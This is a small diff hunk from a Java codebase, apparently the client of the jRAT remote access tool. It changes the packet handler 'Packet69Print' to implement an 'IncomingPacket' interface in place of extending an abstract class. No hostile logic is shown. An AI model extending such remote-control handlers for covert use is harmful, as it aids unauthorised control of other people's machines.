@@ -5,7 +5,7 @@ import jrat.client.Connection;
 import javax.swing.*;
 
 
-public class Packet69Print extends AbstractIncomingPacket {
+public class Packet69Print implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
